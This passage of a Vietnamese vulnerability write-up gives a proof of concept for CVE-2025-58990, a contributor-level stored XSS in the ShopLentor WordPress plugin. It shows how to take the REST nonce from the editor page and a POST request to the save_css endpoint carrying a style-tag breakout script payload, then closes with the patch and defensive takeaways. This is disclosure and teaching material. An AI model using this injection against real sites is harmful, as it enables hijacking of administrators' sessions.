</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="nt">&#34;post_id&#34;</span><span class="p">:</span><span class="mi">1416</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="nt">&#34;has_block&#34;</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="nt">&#34;block_css&#34;</span><span class="p">:</span><span class="s2">&#34;&lt;/style&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;style&gt;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p><strong>Response</strong></p>
<json-viewer value="&#34;{\n    \&#34;code\&#34;:\&#34;rest_forbidden\&#34;,\n    \&#34;message\&#34;:\&#34;Sorry, you are not allowed to do that.\&#34;,\n    \&#34;data\&#34;:{\n        \&#34;status\&#34;:401\n    }\n}&#34;" expand-depth="1" boxed copyable="{&#34;copiedText&#34;:&#34;Đã sao chép&#34;,&#34;copyText&#34;:&#34;Sao chép&#34;}"></json-viewer><p>👉 Thiếu header <strong>X-WP-Nonce</strong> để phân quyền người dùng. Ta mở source HTML (<kbd>Ctrl</kbd>+<kbd>U</kbd>) trang chỉnh sửa bài viết:</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">view-source:http://localhost/wp-admin/post.php?post=&lt;post_id&gt;&amp;action=edit</span></span></code></pre></td></tr></table></div>
</div>
</div><p>Tìm <code>wpApiSettings</code> trong source và lấy giá trị <code>nonce</code></p>
<figure><img src="/posts/2025-10-05-cve-2025-58990/api_search.png"
    alt="wpApiSettings"><figcaption>
      <p>wpApiSettings</p>
    </figcaption>
</figure>

<p>Gửi request với <strong>X-WP-Nonce</strong> có giá trị vừa lấy được</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-http"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/wp-json/woolentor/v1/save_css</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">localhost</span>
</span></span><span class="line"><span class="cl"><span class="n">X-WP-Nonce</span><span class="o">:</span> <span class="l">f79ec79e4b</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="nt">&#34;post_id&#34;</span><span class="p">:</span><span class="mi">1416</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="nt">&#34;has_block&#34;</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="nt">&#34;block_css&#34;</span><span class="p">:</span><span class="s2">&#34;&lt;/style&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;style&gt;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p><strong>Preview post</strong></p>
<figure><img src="/posts/2025-10-05-cve-2025-58990/preview.png"
    alt="Preview"><figcaption>
      <p>Preview</p>
    </figcaption>
</figure>

<p>👉 XSS thành công, <strong>inspect</strong> để xem code được thay đổi như nào</p>
<p><strong>View source code</strong></p>
<figure><img src="/posts/2025-10-05-cve-2025-58990/code.png"
    alt="Code"><figcaption>
      <p>Code</p>
    </figcaption>
</figure>

<h2 class="heading-element" id="conclusion"><span>Conclusion</span>
  <a href="#conclusion" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>Lỗ hổng <strong>CVE-2025-58990</strong> trong plugin <strong>ShopLentor &lt;= 3.2.0</strong> cho phép <strong>contributor</strong> chèn CSS độc hại dẫn đến Stored XSS khi admin/author preview hoặc xem post. Bản vá <strong>3.2.1</strong> bổ sung kiểm tra quyền và sanitize CSS, ngăn chặn khai thác.</p>
<p><strong>Key takeaways</strong>:</p>
<ul>
<li>Luôn kết hợp <strong>kiểm tra quyền</strong> và <strong>sanitize</strong> dữ liệu khi xử lý input từ người dùng.</li>
<li>Các role thấp (như <strong>contributor</strong>) vẫn có thể trở thành điểm tấn công nếu API không bảo vệ đúng cách.</li>
<li><strong>Stored XSS</strong> trong WordPress thường xuất hiện khi dữ liệu được lưu DB/file =&gt; render inline mà không lọc.</li>
<li>Việc cập nhật plugin kịp thời là biện pháp phòng thủ đơn giản nhưng hiệu quả nhất.</li>
</ul>
<h2 class="heading-element" id="references"><span>References</span>
  <a href="#references" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank" rel="external nofollow noopener noreferrer">Cross-site scripting (XSS) cheat sheet</a></p>
<p><a href="https://patchstack.com/database/wordpress/plugin/ShopLentor/vulnerability/wordpress-ShopLentor-plugin-1-0-5-cross-site-scripting-xss-vulnerability" target="_blank" rel="external nofollow noopener noreferrer"> WordPress ShopLentor Plugin &lt;= 3.2.0 is vulnerable to Cross Site Scripting (XSS) </a></p></div><hr class="awesome-hr" />
    <h2 id="see-also">Nội dung liên quan</h2>
    <ul><li>
          <a href="/vi/posts/2025-10-06-cve-2025-10146/" title="CVE-2025-10146 Analysis &amp; POC">CVE-2025-10146 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-10-03-cve-2025-53307/" title="CVE-2025-53307 Analysis &amp; POC">CVE-2025-53307 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-10-04-cve-2025-27006/" title="CVE-2025-27006 Analysis &amp; POC">CVE-2025-27006 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-10-02-cve-2025-6234/" title="CVE-2025-6234 Analysis &amp; POC">CVE-2025-6234 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-10-10-cve-2025-5062/" title="CVE-2025-5062 Analysis &amp; POC">CVE-2025-5062 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-10-08-cve-2025-9816/" title="CVE-2025-9816 Analysis &amp; POC">CVE-2025-9816 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-10-01-cve-2022-21661/" title="CVE-2022-21661 Analysis &amp; POC">CVE-2022-21661 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-09-30-cve-2025-2011/" title="CVE-2025-2011 Analysis &amp; POC">CVE-2025-2011 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-09-29-cve-2025-48118/" title="CVE-2025-48118 Analysis &amp; POC">CVE-2025-48118 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-09-26-cve-2025-32650/" title="CVE-2025-32650 Analysis &amp; POC">CVE-2025-32650 Analysis &amp; POC</a></li></ul><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod"><span title="Cập nhật ngày 2025-11-25 21:12:53">Cập nhật ngày 2025-11-25&nbsp;<a class="git-hash" href="https://github.com/w41bu1/w41bu1.github.io/commit/5cdc85f0661b8418c6576dd1e38e9367a4445be8" rel="external nofollow noopener noreferrer" target="_blank" title="Update category&#10&#10Commit: 5cdc85f0661b8418c6576dd1e38e9367a4445be8 [5cdc85f0]&#10Author: w41bu1&#10Date: 2025-11-25 21:12:53"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i>5cdc85f0</a></span>
      </div><div class="post-info-license">
            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
          </div></div><div class="post-info-line">
        <div class="post-info-md"><span><a href="/vi/posts/2025-10-05-cve-2025-58990/index.md" title="Đọc với định dạng Markdown" class="link-to-markdown">Đọc với định dạng Markdown</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/blob/main/content/posts/2025-10-05-CVE-2025-58990/index.vi.md?plain=1" title="Xem mã nguồn" target="_blank" rel="external nofollow noopener noreferrer" class="link-to-source">Xem mã nguồn</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/edit/main/content/posts/2025-10-05-CVE-2025-58990/index.vi.md" title="Chỉnh sửa trang này" target="_blank" rel="external nofollow noopener noreferrer" class="link-to-edit">Chỉnh sửa trang này</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/issues/new?title=[BUG]%20CVE-2025-58990&#43;Analysis&#43;%26&#43;POC&amp;body=%7cField%7cValue%7c%0A%7c-%7c-%7c%0A%7cTitle%7cCVE-2025-58990&#43;Analysis&#43;%26&#43;POC%7c%0A%7cURL%7chttp://localhost:1313/vi/posts/2025-10-05-cve-2025-58990/%7c%0A%7cFilename%7chttps://github.com/w41bu1/w41bu1.github.io/blob/main/content/posts/2025-10-05-CVE-2025-58990/index.vi.md?plain=1%7c" title="Báo cáo lỗi" target="_blank" rel="external nofollow noopener noreferrer" class="link-to-report">Báo cáo lỗi</a></span><span><a href="vscode://file//home/w41/Project/w41bu1.github.io/content/posts/2025-10-05-CVE-2025-58990/index.vi.md" title="Mở trong trình chỉnh sửa" target="_blank" rel="external nofollow noopener noreferrer" class="link-to-vscode">Mở trong trình chỉnh sửa</a></span></div>
        <div class="post-info-share">
          <span><a href="javascript:void(0);" title="Chia sẻ trên X" data-sharer="twitter" data-url="http://localhost:1313/vi/posts/2025-10-05-cve-2025-58990/" data-title="CVE-2025-58990 Analysis &amp; POC" data-hashtags="analyst,plugin,xss"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Chia sẻ trên Facebook" data-sharer="facebook" data-url="http://localhost:1313/vi/posts/2025-10-05-cve-2025-58990/" data-hashtag="analyst"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Chia sẻ trên Linkedin" data-sharer="linkedin" data-url="http://localhost:1313/vi/posts/2025-10-05-cve-2025-58990/"><i class="fa-brands fa-linkedin fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Chia sẻ trên Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/vi/posts/2025-10-05-cve-2025-58990/" data-title="CVE-2025-58990 Analysis &amp; POC"><i class="fa-brands fa-hacker-news fa-fw" aria-hidden="true"></i></a>
  </span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/vi/tags/analyst/" class="post-tag" title="Nhãn - Analyst">Analyst</a><a href="/vi/tags/plugin/" class="post-tag" title="Nhãn - Plugin">Plugin</a><a href="/vi/tags/xss/" class="post-tag" title="Nhãn - Xss">Xss</a></section>
    <section><span><a href="javascript:void(0);" onclick="window.history.back();">Quay lại</a></span>&nbsp;|&nbsp;<span><a href="/vi/">Trang chủ</a></span>
    </section>
  </div><div class="post-nav"><a href="/vi/posts/2025-10-04-cve-2025-27006/" class="post-nav-item" rel="prev" title="CVE-2025-27006 Analysis &amp; POC"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>CVE-2025-27006 Analysis &amp; POC</a><a href="/vi/posts/2025-10-06-cve-2025-10146/" class="post-nav-item" rel="next" title="CVE-2025-10146 Analysis &amp; POC">CVE-2025-10146 Analysis &amp; POC<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="Nội dung"><h2 class="toc-title">Nội dung&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content always-active" id="toc-content-auto"></div></aside><dialog id="toc-dialog" aria-labelledby="toc-dialog-title" role="dialog">
      <div class="toc">
        <h2 class="toc-title">Nội dung</h2>
        <div class="toc-content" id="toc-content-drawer"><nav >
  <ul>
    <li><a href="#requirements">Requirements</a></li>
    <li><a href="#analysis">Analysis</a>
      <ul>
        <li><a href="#patch-diff">Patch Diff</a></li>
        <li><a href="#how-it-work">How It Work?</a></li>
      </ul>
    </li>
    <li><a href="#exploit">Exploit</a>
      <ul>
        <li><a href="#detect-xss">Detect XSS</a></li>
      </ul>
    </li>
    <li><a href="#conclusion">Conclusion</a></li>
    <li><a href="#references">References</a></li>
  </ul>
</nav></div>
      </div>
    </dialog></main><footer class="footer">
    <div class="footer-container"><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2026</span><span class="author" itemprop="copyrightHolder">
              <a href="github.com/w41bu1">Bui Van Y</a></span><span class="license footer-divider">w41bu1</span></div><div class="footer-line statistics"></div><div class="footer-line visitor">
          <span id="busuanzi_container_site_uv" title='Tổng khách truy cập'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='Tổng lượt truy cập'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
        </div><div class="footer-line beian"><span class="gov"><i class="fa-solid fa-user-secret"></i></span><span class="icp footer-divider"><i class="fa-solid fa-bug"></i></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons"><div class="fixed-button back-to-top animate__faster d-none" role="button" aria-label="Lên trên"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><svg viewBox="0 0 100 100">
              <circle class="bg" cx="50" cy="50" r="50"></circle>
              <circle class="progress" cx="50" cy="50" r="50"></circle>
            </svg></div><div id="toc-drawer-button" class="fixed-button toc-drawer-button d-none" role="button" aria-label="Nội dung"><i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><noscript>
    <div class="noscript-warning">Trang web này hoạt động tốt nhất khi JavaScript được kích hoạt.</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/json-viewer-element/json-viewer-element.umd.js" defer></script><script src="/lib/lightgallery/lightgallery.min.js" defer></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js" defer></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/cell-watermark/watermark.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script src="/vi/js/config/f58c220ca633d4579dbcf237644c64aa.js" defer></script><script src="/js/theme.min.js" defer></script><script src="/js/flyfish.min.js" defer></script></body>
</html>
